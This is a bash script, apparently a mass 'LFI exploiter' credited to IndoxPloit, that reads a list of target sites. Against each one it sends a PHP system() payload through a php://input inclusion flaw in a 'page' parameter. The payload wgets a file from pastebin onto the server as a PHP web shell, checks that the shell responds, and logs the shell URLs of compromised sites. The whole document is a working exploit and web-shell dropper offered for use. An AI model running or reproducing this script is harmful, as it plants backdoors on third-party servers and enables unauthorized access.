#!/bin/bash
cekrce() {
    target=$1
    echo -ne "---";
    upload=$(curl -s --data "<?php system('wget https://pastebin.com/raw/KUDbhDy2 -O 99091023933231312.php;ls -la;pwd;uname -a;whoami');?>" -X GET "${target}?page=php://input" | head -1)
    cekshell=$(curl -s "${target}/99091023933231312.php");
    if [[ $cekshell =~ 'ganteng' ]]; then
    echo "\033[34m[ \033[32mUpload Done \033[34m]\033[0m"
    echo "$result" >> 131sx123mmnxxx1a.txt
    echo "$target/99091023933231312.php" | tee -a 131sx123mmnxxx1a.txt
    echo "=====================================\n" >> 131sx123mmnxxx1a.txt
    else
    echo "\033[34m[ \033[31mFailed \033[34m]\033[0m"
    fi
    }
help(){
	echo -e "\033[34;1mUsage:\n\n\033[31m$0 list.txt\033[0m"
}

clear
echo -e "\033[34;1m
     ___   __    __________   ______           __      _ __               ___
    / _/  / /   / ____/  _/  / ____/  ______  / /___  (_) /____  _____   /  /
   / /   / /   / /_   / /   / __/ | |/_/ __ \/ / __ \/ / __/ _ \/ ___/   / / 
  / /   / /___/ __/ _/ /   / /____>  </ /_/ / / /_/ / / /_/  __/ /      / /  
 / /   /_____/_/   /___/  /_____/_/|_/ .___/_/\____/_/\__/\___/_/     _/ /   
/__/                                /_/                              /__/    

\033[32;1mSource : \033[33mhttps://pastebin.com/gAM95riM
\033[32;1mAuthor : \033[33mIndoxPloit\033[0m

"

if [ $? -ne 1 ]; then 
	help
else
	for s in $(cat $1); do echo -e "\033[34m[ \033[37mCHECKING \033[34m] \033[34m-> \033[34m$s\033[0m "; echo -ne "----"; cekrce $s; done
fi
